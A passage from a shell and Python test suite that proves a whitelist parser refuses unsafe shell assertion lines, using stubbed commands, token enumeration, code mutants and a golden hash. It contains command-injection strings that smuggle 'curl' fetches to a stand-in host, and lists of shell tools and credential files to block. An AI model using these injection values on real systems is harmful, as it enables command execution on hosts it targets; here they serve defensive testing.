string = and != on $(cat -- ...)	t "r" "x" bash -c 'test "$(cat -- "$1")" != "b" && [ "$(cat -- "$2")" = "a" ]' _ "$work/rc" "$CALLS"
arithmetic on digits and on $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c -E -- "a" "$1")" -eq 1 && [ 3 -ne 4 ] && test 1 -lt 2 && test 2 -le 2 && test 3 -gt 2' _ "$CALLS"
escaped dot and brackets in a pattern	t "r" "x" bash -c 'grep -Eq -- "\[a\.b\]" "$1"' _ "$CALLS"
a pattern whose first character is a space, then a dash	t "r" "x" bash -c 'grep -q -- " -x" "$1"' _ "$CALLS"
no argument after _	t "r" "x" bash -c 'test 1 -eq 1' _
synthetic, the HTTPS-check shape: no unknown field, one flag with its value, no second flag, a count	t "rule 9" "synthetic: every call has the flag --alpha with the value =beta, once, and no plain http address" bash -c 'grep -q -- " unk:\[" "$1" && exit 1; grep -- "^argv \[tool\]" "$1" | grep -v -q -- " opt:\[--alpha\] val:\[=beta\]" && exit 1; grep -Eq -- " opt:\[--alpha\] .* opt:\[--alpha\]| url:\[http://" "$1" && exit 1; test "$(grep -c -- "^argv \[tool\]" "$1")" -ge 3' _ "$work/argv"
synthetic, the cap-check shape: selected calls, a positive whole-number value, a count	t "rule 9" "synthetic: every selected call has a positive cap" bash -c 'grep -E -- "^argv \[tool\] .* url:\[https://example\.invalid/(a.b|cd)/" "$1" | grep -v -Eq -- " opt:\[--cap\] val:\[(1|2|3|4|5|6|7|8|9)(0|1|2|3|4|5|6|7|8|9)*\]" && exit 1; test "$(grep -c -E -- "^argv \[tool\] .* url:\[https://example\.invalid/(a.b|cd)/" "$1")" -ge 1' _ "$work/argv"
synthetic, the status-file shape: an exit status, an existing log, no selected call	t "rule 9" "synthetic: status 2, the log exists and holds no selected call" bash -c 'test "$(cat -- "$1")" = 2 && test -f "$2" && ! grep -q -E -- " url:\[https://example\.invalid/(a.b|cd)/" "$2"' _ "$work/rc" "$work/argv"
synthetic, the first-field shape: a required first field and no redirect flag in any letter group	t "rule 9" "synthetic: every call starts with opt -q and none has -L" bash -c 'grep -- "^argv \[tool\]" "$1" | grep -v -q -- "^argv \[tool\] opt:\[-q\]" && exit 1; grep -- "^argv \[tool\]" "$1" | grep -Eq -- " opt:\[-(f|s|S|g|q)*L(f|s|S|g|q|o|m)*\]| opt:\[--location\]" && exit 1; test "$(grep -c -- "^argv \[tool\] opt:\[-q\]" "$1")" -ge 3' _ "$work/argv"
a file test on a positional ($1 or $2)	t "r" "x" bash -c 'test -f "$1" && [ -s "$2" ] && ! test -d "$2"' _ "$work/rc" "$CALLS"
EOF
while IFS=$'\t' read -r what line; do
  hf "$line"
  CASE="AC16 harness form: accepted ($what): exit 0"
  check test "$rc" -eq 0; check grep -q '^harness assertion' "$work/hf.out"
done <"$work/hf-accepted.tsv"
# the distinct lines of the committed rows for bin/refresh-inputs-test.sh (the final P3 tree): the harness lines among them must be accepted, and all of them run in the runtime proof
cat >"$work/hf-real.txt" <<'EOF'
# ---- P3 review round 2 (Sonnet extras): pointer, certified.txt shape, index tied to the locks, datahash, ranges, curl flags, openssl -----------------------------
# the live melange resolution moves busybox to 9.9.9-r0: a copy of the live melange lock with that version, and the new apk in the live archive/curl dir
# url characters, curl flags and caps
EOF
while IFS= read -r line; do
  case "$line" in t\ *) hf "$line"; CASE="AC16 harness form: accepted (the committed row line ${line:0:60}...): exit 0"; check test "$rc" -eq 0;; esac
done <"$work/hf-real.txt"
CASE="AC16 harness form: the real-line list is exactly the distinct lines of the committed rows for bin/refresh-inputs-test.sh (by whole-line hash)"
check python3 - "$work/hf-real.txt" "$root/.github/supply-chain-exceptions.json" <<'PY'
import hashlib, json, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
real = {H(" ".join(l.split())) for l in open(sys.argv[1]).read().split("\n") if l}
rows = {r["line"] for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["file"] == "bin/refresh-inputs-test.sh"}
assert real == rows, (sorted(real ^ rows))
PY
# --- RUNTIME proof (Sonnet R1): every corpus line is EXECUTED under every bash on PATH (one per version: bash 5, whose test -v / -R / arithmetic operands
# evaluate $(...) even in single quotes, and, where present, an older bash such as 3.2), with a stub directory first on PATH whose curl, wget, touch, cmd and
# ls only write a marker file; the inner bash is the same shell. Then: every line that wrote the marker was refused by the parser, the planted reproductions
# did write it (the harness detects a run), and every accepted line (the corpus and the committed real lines) ran and wrote nothing, with plain paths and
# with quote-, substitution- and subscript-carrying argument values.
cat >"$work/hf_run.py" <<'PY'
import json, os, subprocess, sys, tempfile
hfpy, w = sys.argv[1], sys.argv[2]
def shells():                                              # every bash on PATH, one per version: bash 5 (the reproductions) and, where present, an older one (3.2)
    seen, out = set(), []
    for d in os.environ.get("PATH", "").split(os.pathsep):
        p = os.path.join(d, "bash")
        if d and os.access(p, os.X_OK):
            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
            v = r.stdout.strip()
            if r.returncode == 0 and v and v not in seen:
                seen.add(v); out.append((p, v))
    return out
SH = shells()
b5 = next((p for p, v in SH if int(v.split(".")[0]) >= 5), None)
corpus = []
for kind, name in (("refused", "hf-refused.tsv"), ("accepted", "hf-accepted.tsv")):
    for l in open(os.path.join(w, name)).read().split("\n"):
        if l:
            what, line = l.split("\t", 1); corpus.append((kind, what, line))
for l in open(os.path.join(w, "hf-real.txt")).read().split("\n"):
    if l:
        corpus.append(("real", l[:60], l))
for f in sorted(os.listdir(w)):
    if f.startswith("ctl-") and f.endswith(".txt"):
        corpus.append(("refused", open(os.path.join(w, f[:-4] + ".what")).read(), open(os.path.join(w, f), encoding="utf-8", newline="").read()))
# argument values that would add a command if the outer shell spliced them into code (Codex R1): the accepted form passes them as data only
HOSTILE = ["x'; curl -s https://e.example/x; #", 'x"; curl -s https://e.example/x; #', "$(curl -s https://e.example/x)", "a[$(curl -s https://e.example/x)]",
           "`curl -s https://e.example/x`"]
out = {"bash5": b5, "shells": [v for _, v in SH], "hostile": HOSTILE, "lines": []}
if b5:
    for kind, what, line in corpus:
        marks = {}
        for sh, ver in SH:
            d = tempfile.mkdtemp(dir=w, prefix="hfrun.")
            st = os.path.join(d, "stubs"); os.mkdir(st)
            mark = os.path.join(d, "marker")
            for n in ("curl", "wget", "touch", "cmd", "ls"):
                p = os.path.join(st, n); open(p, "w").write("#!%s\necho \"$0 $*\" >>\"$MARK\"\n" % sh); os.chmod(p, 0o755)
            p = os.path.join(st, "bash"); open(p, "w").write("#!%s\nexec %s \"$@\"\n" % (sh, sh)); os.chmod(p, 0o755)
            for n, t in (("f", "a\n"), ("g", "b\n"), ("rc", "0\n"), ("calls", "curl --proto =https --tlsv1.2 -g --max-filesize 1 --max-time 1 x\n"),
                         ("evil", "a[$(curl -s https://e.example/x)]\n")):
                open(os.path.join(d, n), "w").write(t)
            def run(work, calls, u):
                if os.path.exists(mark): os.remove(mark)
                env = {"PATH": st + os.pathsep + os.environ["PATH"], "HOME": d, "MARK": mark, "work": work, "CALLS": calls, "u": u, "LC_ALL": "C"}
                try:
                    subprocess.run([sh, "-c", 't() { shift 2; "$@"; }\n' + line], cwd=d, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=20)
                except subprocess.TimeoutExpired:
                    pass
                return os.path.exists(mark)
            marks[ver] = {"plain": run(d, os.path.join(d, "calls"), "x"), "hostile": [h for h in HOSTILE if run(h, h, h)]}
        verdict = subprocess.run([sys.executable, hfpy, line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
        out["lines"].append({"kind": kind, "what": what, "marked": any(m["plain"] for m in marks.values()),
                             "marked_hostile": sorted({h for m in marks.values() for h in m["hostile"]}), "by_shell": marks,
                             "refused": verdict.returncode == 1 and verdict.stdout.startswith("refused: "),
                             "accepted": verdict.returncode == 0 and verdict.stdout.startswith("harness assertion")})
json.dump(out, open(os.path.join(w, "hf-run.json"), "w"), indent=1)
PY
python3 "$work/hf_run.py" "$work/harness_form.py" "$work" </dev/null
hfr() { python3 - "$work/hf-run.json" "$1" <<'PY'
import json, sys
r = json.load(open(sys.argv[1])); L = r["lines"]; m = sys.argv[2]
assert r["bash5"], "no bash 5 on PATH"
if m == "marked-refused": bad = [x["what"] for x in L if (x["marked"] or x["marked_hostile"]) and not x["refused"]]
elif m == "accepted-clean": bad = [x["what"] for x in L if (x["kind"] in ("accepted", "real")) and (x["marked"] or x["marked_hostile"] or not x["accepted"] and x["kind"] == "accepted")]; assert sum(x["kind"] == "real" for x in L) == sum(1 for l in open(sys.argv[1].replace("hf-run.json", "hf-real.txt")) if l.strip())
elif m == "repros-mark":
    bad = [x["what"] for x in L if x["what"].startswith(("Sonnet R1 reproduction", "test -v \"a[$(touch X)]\"", "[ -v \"x[$(cmd)]\" ]")) and not x["marked"]]
    bad += [x["what"] for x in L if x["what"].startswith("Codex R1 reproduction") and not x["marked_hostile"]]
    assert sum(x["what"].startswith(("Sonnet R1 reproduction", "Codex R1 reproduction")) for x in L) == 3
print(sum(bool(x["marked"] or x["marked_hostile"]) for x in L), "of", len(L), "corpus lines wrote the marker (plain or hostile argument values); bad:", bad)
assert not bad, bad
PY
}
CASE="AC16 harness runtime: a bash of version 5 or newer is on PATH (the runtime proof needs it)"
check python3 -c "import json,sys; assert json.load(open(sys.argv[1]))['bash5']" "$work/hf-run.json"
CASE="AC16 harness runtime: the planted reproductions (newline in the body, test -v / [ -v with a \$(...) subscript; Codex: a double-quoted body run with a quote-carrying \$CALLS) DO write the marker under bash 5: the harness detects a run"
check hfr repros-mark
CASE="AC16 harness runtime: every corpus line that wrote the marker when run is refused by the parser"
check hfr marked-refused
CASE="AC16 harness runtime: every accepted line (the corpus and every distinct committed real line) runs under bash 5 and writes no marker, with plain paths AND with \$work, \$CALLS and \$u set to quote-, substitution- and subscript-carrying values"
check hfr accepted-clean
hfr marked-refused >"$work/hf-run.summary" 2>&1 || true; cat "$work/hf-run.summary"
CASE="AC16 harness runtime: the shells the corpus ran under are reported (one per bash version on PATH)"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('shells:', r['shells']); assert r['shells']" "$work/hf-run.json"
python3 -c "import json,sys; print('harness runtime shells:', json.load(open(sys.argv[1]))['shells'])" "$work/hf-run.json"
# --- COMPLEMENT enumeration: every token class outside HARNESS_WHITELIST (every character, every bash keyword and builtin, external commands, every test
# operator, grep options, every variable name bash lists plus the specials and near-misses of work / CALLS) in every position it can take (RULE, TITLE,
# BODY command position, before a command, BODY argument, grep option, inside a double-quoted pattern, test operator, separator, after a pipe, as a
# substitution, exit status, ARG name and path), plus the refused corpus. One case per class; each line must be refused.
cat >"$work/hf_enum.py" <<'PY'
import importlib.util, json, os, subprocess, sys
# hf_enum.py JUDGE.py SKIP.py REFUSED.tsv OUT.json: every token class OUTSIDE SKIP's HARNESS_WHITELIST, in every position it can take, judged by JUDGE's parser.
# The universe of tokens is fixed here (every character, every keyword and builtin bash lists, the external commands, every test operator, a broad set of grep
# options, every variable name bash lists plus the specials), so widening the whitelist by one token turns an expected refusal into an acceptance.
def load(p, n):
    spec = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
J, S = load(sys.argv[1], "judge_mod"), load(sys.argv[2], "skip_mod")
W = S.HARNESS_WHITELIST
def bash_lists():
    for d in os.environ.get("PATH", "").split(os.pathsep):
        p = os.path.join(d, "bash")
        if d and os.access(p, os.X_OK):
            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
            if r.returncode == 0 and r.stdout.strip().isdigit() and int(r.stdout) >= 5:
                g = lambda f: subprocess.run(["env", "-i", p, "--norc", "--noprofile", "-c", "compgen " + f], capture_output=True, text=True, stdin=subprocess.DEVNULL).stdout.split()
                return g("-k"), g("-b"), g("-v")
    return [], [], []
kw, bi, vs = bash_lists()
KEYWORDS = sorted(set(kw) | {"if", "then", "else", "elif", "fi", "case", "esac", "for", "select", "while", "until", "do", "done", "in", "function", "time", "coproc", "{", "}", "!", "[[", "]]"})
BUILTINS = sorted(set(bi) | {"eval", "source", ".", "exec", "command", "builtin", "let", "declare", "typeset", "local", "readonly", "export", "read", "mapfile", "readarray",
                             "printf", "echo", "set", "unset", "shift", "trap", "alias", "enable", "hash", "type", "cd", "pushd", "ulimit", "umask", "wait", "kill", "true", "false", ":"})
EXTERNAL = ["curl", "wget", "sh", "bash", "zsh", "dash", "python3", "perl", "ruby", "node", "nc", "ssh", "scp", "env", "xargs", "find", "awk", "sed", "tee", "dd", "rm", "cp",
            "mv", "ln", "chmod", "ls", "touch", "cmd", "git", "gh", "openssl", "base64", "tar", "unzip", "install", "sudo", "nohup", "timeout", "watch", "egrep", "fgrep", "zgrep"]
WORDS = sorted(set(KEYWORDS + BUILTINS + EXTERNAL) | {"$x", "$1", "$(cmd)", "`cmd`", "${x}", "$[1]", "$((1))", "a[1]", "x=1", "*", "?", "~", "-", "--", "'a'", "\\a"})
TEST_OPS = ["-a", "-b", "-c", "-d", "-e", "-f", "-g", "-h", "-k", "-p", "-r", "-s", "-t", "-u", "-w", "-x", "-G", "-L", "-N", "-O", "-S", "-z", "-n", "-o", "-v", "-R",
            "=", "==", "!=", "<", ">", "=~", "-ef", "-nt", "-ot", "-eq", "-ne", "-lt", "-le", "-gt", "-ge", "!", "(", ")", "-A", "-l"]
GREP_OPTS = ["-f", "-e", "-r", "-R", "-P", "-z", "-o", "-l", "-L", "-n", "-c", "-i", "-x", "-w", "-F", "-G", "-A", "-B", "-C", "-H", "-h", "-s", "-U", "-a", "-I", "-m", "-b",
             "-d", "-D", "-T", "-Z", "--file", "--file=x", "--include=*", "--exclude=*", "--null", "--color", "--regexp", "--recursive", "-Ef", "-qf", "-E", "-q", "-v", "-Eq", "-vq", "--"]
VARS = sorted(set(vs) | {"0", "1", "9", "@", "*", "#", "?", "-", "$", "!", "_", "HOME", "PATH", "IFS", "BASH_ENV", "ENV", "PS4", "u", "x", "other", "Work", "works",
                         "WORK", "CALL", "calls", "CALLS2", "CALLSx", "wor", "w"})
CHARS = [chr(c) for c in range(128)] + ["é", " ", " ", "﻿"]
SEPS = ["&", ";;", "|&", "&>", ">", "<", ">>", "<<", "<<<", ">|", "<>", "(", ")", "{", "}", "`", "\n", "\r", "&&&", "|||", ";&", ";;&"] + CHARS
EXITS = ["10", "-1", "x", "1 2", "01", "\"1\"", "$x", "256", "9 9", "\"$1\""] + [c for c in CHARS]
BODY = lambda b, args=' _ "$CALLS"': "t \"r\" \"x\" bash -c '" + b + "'" + args
L = []
def case(cls, line, reason=None): L.append((cls, line, reason))
for c in CHARS:
    if c not in W["rule_title_chars"]:
        case("a character outside rule_title_chars, in the RULE", 't "r' + c + '" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
        case("a character outside rule_title_chars, in the TITLE", 't "r" "x' + c + '" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
    if c not in W["line_chars"]:
        case("a character outside line_chars (refused for that reason)", 't "r" "x' + c + '" bash -c \'grep -q . "$1"\' _ "$CALLS"', "line character set")
    if c not in W["dquote_chars"]:
        case("a character outside dquote_chars, in a double-quoted pattern", BODY('grep -q -- "a' + c + 'b" "$1"'))
    if "\\" + c not in W["dquote_escapes"]:
        case("a backslash sequence outside dquote_escapes", BODY('grep -q -- "a\\' + c + 'b" "$1"'))
    if c not in " \t" and c not in W["grep_options"] and c not in W["grep_bare_patterns"]:
        case("a character as an unquoted grep pattern", BODY('grep -q -- ' + c + ' "$1"'))
        if c not in W["grep_options"]:
            case("a character as an unquoted grep option", BODY('grep -q ' + c + ' -- "a" "$1"'))
    if c not in " \t":
        case("a character in BODY command position", BODY(c + ' "$1"'))
        case("a character glued to a command word", BODY('grep' + c + ' -q -- . "$1"'))
    if c not in W["arg_path_chars"]:
        case("a character outside arg_path_chars, in an ARG path", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS/x' + c + '"')
for s in SEPS:
    if s not in W["separators"] and s not in " \t":
        case("a separator outside separators", BODY('grep -q -- "a" "$1" ' + s + ' grep -q -- "b" "$1"'))
for w in WORDS:
    if w not in W["commands"]:
        case("a word outside commands, in BODY command position", BODY(w + ' "$1"'))
        case("a word outside commands, after a negation", BODY('! ' + w + ' "$1"'))
    if w not in W["grep_options"] and w not in W["grep_bare_patterns"]:
        case("a word as an unquoted grep option", BODY('grep -q ' + w + ' -- "a" "$1"'))
        case("a word as an unquoted grep pattern", BODY('grep -q -- ' + w + ' "$1"'))
    if w not in W["pipe_into"]:
        case("a word outside pipe_into, after a pipe", BODY('grep -- "a" "$1" | ' + w + ' "$1"'))
    if w not in W["substitutions"]:
        case("a word outside substitutions, as a substitution command", BODY('test "$(' + w + ' -- "$1")" = "a"'))
    case("a word as an unquoted ARG", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ ' + w)
for w in sorted(set(WORDS) | set(CHARS)):
    if w not in W["negation"] and w not in W["commands"] and w not in " \t":
        case("a word before a command (outside negation)", BODY(w + ' grep -q -- . "$1"'))
        case("a word before a test expression (outside negation)", BODY('test ' + w + ' -f "$1"'))
for c in W["commands"]:
    if c not in W["pipe_into"]:
        case("a command outside pipe_into, after a pipe", BODY('grep -- "a" "$1" | ' + {"cat": 'cat -- "$1"', "test": 'test -f "$1"', "[": '[ -f "$1" ]', "exit": "exit 1"}.get(c, c + ' "$1"')))
for o in TEST_OPS:
    if o not in W["test_unary"]:
        case("a test operator outside test_unary (OP X)", BODY('test ' + o + ' "$1"'))
        case("a [ operator outside test_unary (OP X)", BODY('[ ' + o + ' "$1" ]'))
    if o not in W["test_string"] and o not in W["test_count"]:
        case("a test operator outside test_string / test_count (X OP Y)", BODY('test "$1" ' + o + ' "a"'))
        case("a test operator outside test_string / test_count (N OP N)", BODY('test 1 ' + o + ' 2'))
for o in GREP_OPTS:
    if o not in W["grep_options"]:
        case("a grep option outside grep_options", BODY('grep ' + o + ' -- "a" "$1"'))
        case("a grep option outside grep_options, in the count substitution", BODY('test "$(grep -c ' + o + ' -- "a" "$1")" -ge 1'))
for e in EXITS:
    if e not in W["exit_status"] and e not in " \t":
        case("an exit status outside exit_status", BODY('grep -q -- "a" "$1" && exit ' + e))
for v in VARS:
    if v not in W["arg_names"]:
        case("a variable outside arg_names, as an ARG", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$' + v + '"')
        case("a variable outside arg_names, as an ARG path", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$' + v + '/x"')
        if not (len(v) == 1 and v in "123456789"):                    # "$1".."$9" whole is the positional the whitelist names
            case("a variable in a double-quoted pattern", BODY('grep -q -- "$' + v + '" "$1"'))
        case("a variable as an unquoted BODY argument", BODY('grep -q -- $' + v + ' "$1"'))
        case("a variable in the TITLE", 't "r" "x $' + v + '" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
QOPTS = sorted(set(GREP_OPTS) | {"--file=/etc/hosts", "--file=pats", "--version", "--pager=touch M", "--filter=cmd", "--view", "--regexp=x", "-e", "-f", "-r", "-E", "-q", "-v", "-Eq", "--", "-", "-c"})
for o in QOPTS:
    case("an option-like word DOUBLE-QUOTED in a grep option position", BODY('grep "' + o + '" -- "a" "$1"'))
    case("an option-like word DOUBLE-QUOTED as the grep pattern", BODY('grep -q -- "' + o + '" "$1"'))
    case("an option-like word DOUBLE-QUOTED as a grep file operand", BODY('grep -q -- "a" "' + o + '"'))
    case("an option-like word DOUBLE-QUOTED in the count substitution's option position", BODY('test "$(grep -c "' + o + '" -- "a" "$1")" -ge 1'))
    case("an option-like word DOUBLE-QUOTED as the count substitution's pattern", BODY('test "$(grep -c -- "' + o + '" "$1")" -ge 1'))
    if o not in W["grep_options"] and o != W["end_of_options"]:
        case("an option-like word BARE in a grep option position", BODY('grep -q ' + o + ' -- "a" "$1"'))
        case("an option-like word BARE in the count substitution's option position", BODY('test "$(grep -c ' + o + ' -- "a" "$1")" -ge 1'))
    case("an option-like word BARE after end_of_options (a second option, or a bare pattern)", BODY('grep -q -- ' + o + ' "a" "$1"'))
    case("an option-like word as cat's operand", BODY('test "$(cat -- "' + o + '")" = "a"'))
for op in W["test_unary"]:
    for v in ('"/etc/passwd"', '"x"', '"$(cat -- "$1")"', '"$(grep -c -- "a" "$1")"', '1', '.', '"$2"'):
        case("a file-test operand that is not a positional within the arguments", BODY('test ' + op + ' ' + v))
        case("a file-test operand that is not a positional within the arguments, [ form", BODY('[ ' + op + ' ' + v + ' ]'))
    case("a file test with an extra argument", BODY('test ' + op + ' "$1" "$1"'))
for extra in ('"$1"', 'x', '"a"', '--'):
    case("cat with more than one operand", BODY('test "$(cat -- "$1" ' + extra + ')" = "a"'))
    case("cat with more than one operand, as a command", BODY('cat -- "$1" ' + extra))
case("grep without end_of_options before the pattern", BODY('grep -q "a" "$1"'))
case("grep without end_of_options, in the count substitution", BODY('test "$(grep -c "a" "$1")" -ge 1'))
case("cat without end_of_options", BODY('test "$(cat "$1")" = "a"'))
case("cat without end_of_options, as a command", BODY('cat "$1"'))
case("more ARGs than max_args", 't "r" "x" bash -c \'grep -q -- . "$1"\' _' + ' "$CALLS"' * (W["max_args"] + 1))
for l in open(sys.argv[3]).read().split("\n"):
    if l:
        what, line = l.split("\t", 1); case("the refused corpus: " + what, line)
out = {"classes": {}, "total": len(L), "accepted": 0, "wrong_reason": 0}   # accepted: an expected refusal was ACCEPTED; wrong_reason: refused, but not for the expected reason
for cls, line, reason in L:
    d = out["classes"].setdefault(cls, {"n": 0, "accepted": [], "wrong_reason": []}); d["n"] += 1
    try:
        J.judge(line)
    except J.Refused as e:
        if reason is not None and reason not in str(e):
            d["wrong_reason"].append(repr(line)[:160]); out["wrong_reason"] += 1
        continue
    d["accepted"].append(repr(line)[:160]); out["accepted"] += 1
json.dump(out, open(sys.argv[4], "w"), indent=1)
PY
python3 "$work/hf_enum.py" "$work/harness_form.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$work/hf-enum.json" </dev/null
python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness enumeration:', r['total'], 'lines in', len(r['classes']), 'classes,', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$work/hf-enum.json"
while IFS= read -r cls; do
  CASE="AC16 harness enumeration: refused in every case ($cls)"
  check python3 -c "import json,sys; d=json.load(open(sys.argv[1]))['classes'][sys.argv[2]]; assert d['n'] > 0 and not d['accepted'] and not d['wrong_reason'], (d['accepted'][:5], d['wrong_reason'][:5])" "$work/hf-enum.json" "$cls"
done < <(python3 -c "import json,sys; [print(k) for k in json.load(open(sys.argv[1]))['classes'] if not k.startswith('the refused corpus: ')]" "$work/hf-enum.json")
CASE="AC16 harness enumeration: at least 3000 lines in at least 30 classes, none accepted and none refused for another reason"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['total'] >= 3000 and len([k for k in r['classes'] if not k.startswith('the refused')]) >= 30 and r['accepted'] == 0 and r['wrong_reason'] == 0, (r['total'], r['accepted'], r['wrong_reason'])" "$work/hf-enum.json"
# --- CODE mutants: the role rules that live in the parser's code are loosened one at a time in a temp copy; the enumeration and the refused corpus must
# then find an unexpected acceptance (or a refusal for another reason). A surviving mutant means no case pins that rule.
hcm=$(mktemp -d "$work/hfcode.XXXXXX")
while IFS=$'\t' read -r what old new; do
  python3 - "$work/harness_form.py" "$hcm/m.py" "$old" "$new" <<'PY'
import sys
s = open(sys.argv[1]).read(); assert s.count(sys.argv[3]) == 1, sys.argv[3]
open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
PY
  python3 "$work/hf_enum.py" "$hcm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hcm/e.json" </dev/null
  CASE="AC16 harness code mutant: $what is caught (an unexpected acceptance, or a refusal for another reason)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hcm/e.json"
done <<'EOF'
a file-test operand may be any operand (Codex R6)	args[0][1] in W["test_unary"] and args[1][2] == "pos": return	args[0][1] in W["test_unary"] and operand(args[1]): return
cat takes at least, not exactly, its operands (Sonnet R6)	if len(rest) != len(want) or any(	if len(rest) < len(want) or any(
a positional may name an argument that is not there	if t[2] == "pos" and int(t[1]) > len(args): raise	if t[2] == "pos" and int(t[1]) > 9: raise
EOF
# --- the GOLDEN whitelist (Sonnet, PR 289 round 5: the mutation run catches only the widenings it lists; a security control fails closed). The sha256 of
# HARNESS_WHITELIST as canonical JSON (sorted keys, no spaces, ASCII) must equal HARNESS_WHITELIST_GOLDEN below: ANY change to the grammar, a widening
# the mutation list does not name included, turns this suite red. Changing the grammar is therefore two deliberate edits in one reviewed diff: the
# whitelist, and this golden value (whose new value the failing case prints).
HARNESS_WHITELIST_GOLDEN=b2584723ffad2283b2d195aff694c38669d7746ef2e1dfe2520207768060371d
cat >"$work/hf_gold.py" <<'PY'
import hashlib, importlib.util, json, sys
spec = importlib.util.spec_from_file_location("hf", sys.argv[1]); m = importlib.util.module_from_spec(spec)
sys.argv = [sys.argv[1], "--file", "/dev/null"]   # harness_form.py judges only when run as a script: importing it runs nothing
spec.loader.exec_module(m)
print(hashlib.sha256(json.dumps(m.HARNESS_WHITELIST, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode()).hexdigest())
PY
hfg=$(python3 "$work/hf_gold.py" "$work/harness_form.py" </dev/null)
CASE="AC16 harness whitelist: HARNESS_WHITELIST equals the reviewed golden (canonical sha256 $HARNESS_WHITELIST_GOLDEN; this tree's whitelist hashes to $hfg)"
check test "$hfg" = "$HARNESS_WHITELIST_GOLDEN"
hgd=$(mktemp -d "$work/hfgold.XXXXXX")
while IFS=$'\t' read -r what patch; do
  python3 - "$work/harness_form.py" "$hgd/m.py" "$patch" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"; assert s.count(m) == 1
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
  CASE="AC16 harness whitelist: a widening the mutation list does not name ($what) changes the canonical hash, so the golden check is red"
  check test "$(python3 "$work/hf_gold.py" "$hgd/m.py" </dev/null)" != "$HARNESS_WHITELIST_GOLDEN"
done <<'EOF'
commands + xargs (Sonnet R4)	HARNESS_WHITELIST["commands"].append("xargs")
pipe_into + sh (Sonnet R4)	HARNESS_WHITELIST["pipe_into"].append("sh")
grep_options + -P (Sonnet R4)	HARNESS_WHITELIST["grep_options"].append("-P")
; in rule_title_chars (Sonnet R4)	HARNESS_WHITELIST["rule_title_chars"] += ";"
grep_options + -vq	HARNESS_WHITELIST["grep_options"].append("-vq")
a new key	HARNESS_WHITELIST["extra"] = []
a reordered list (order is part of the reviewed text)	HARNESS_WHITELIST["commands"].reverse()
EOF
python3 - "$work/harness_form.py" "$hgd/m.py" "pass" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
CASE="AC16 harness whitelist: a no-op patch keeps the canonical hash (the golden check detects change, not noise)"
check test "$(python3 "$work/hf_gold.py" "$hgd/m.py" </dev/null)" = "$HARNESS_WHITELIST_GOLDEN"
# --- MUTATION run (like pip-pin's): a temp copy of harness_form.py with HARNESS_WHITELIST widened by ONE token; the enumeration (positions and skips from
# the real whitelist) and the refused corpus must then report at least one line the real whitelist refuses for the expected reason that the mutant either
# ACCEPTS (an unexpected acceptance) or refuses for ANOTHER reason (the newline and CR line_chars mutants: the shape still refuses those lines, so they
# change the reason, not the verdict). The two counts are reported apart. A mutant with neither means the suite does not pin the whitelist.
cat >"$work/hf-mut.tsv" <<'EOF'
commands + curl	HARNESS_WHITELIST["commands"].append("curl")
commands + sh	HARNESS_WHITELIST["commands"].append("sh")
commands + eval	HARNESS_WHITELIST["commands"].append("eval")
commands + bash	HARNESS_WHITELIST["commands"].append("bash")
test_unary + -v	HARNESS_WHITELIST["test_unary"].append("-v")
test_unary + -R	HARNESS_WHITELIST["test_unary"].append("-R")
test_unary + -n	HARNESS_WHITELIST["test_unary"].append("-n")
test_string + ==	HARNESS_WHITELIST["test_string"].append("==")
test_count + -nt	HARNESS_WHITELIST["test_count"].append("-nt")
arg_names + other	HARNESS_WHITELIST["arg_names"].append("other")
arg_names + HOME	HARNESS_WHITELIST["arg_names"].append("HOME")
separators + &	HARNESS_WHITELIST["separators"].append("&")
separators + >	HARNESS_WHITELIST["separators"].append(">")
pipe_into + cat	HARNESS_WHITELIST["pipe_into"].append("cat")
grep_options + -f	HARNESS_WHITELIST["grep_options"].append("-f")
grep_options + -e	HARNESS_WHITELIST["grep_options"].append("-e")
grep_bare_patterns + *	HARNESS_WHITELIST["grep_bare_patterns"].append("*")
exit_status + 10	HARNESS_WHITELIST["exit_status"].append("10")
rule_title_chars + $	HARNESS_WHITELIST["rule_title_chars"] += "$"
rule_title_chars + backtick	HARNESS_WHITELIST["rule_title_chars"] += "`"
rule_title_chars + '	HARNESS_WHITELIST["rule_title_chars"] += "'"
dquote_chars + $	HARNESS_WHITELIST["dquote_chars"] += "$"
dquote_chars + backtick	HARNESS_WHITELIST["dquote_chars"] += "`"
dquote_chars + backslash	HARNESS_WHITELIST["dquote_chars"] += "\\"
dquote_chars + !	HARNESS_WHITELIST["dquote_chars"] += "!"
dquote_escapes + \$	HARNESS_WHITELIST["dquote_escapes"].append("\\$")
line_chars + newline	HARNESS_WHITELIST["line_chars"] += "\n"
line_chars + CR	HARNESS_WHITELIST["line_chars"] += "\r"
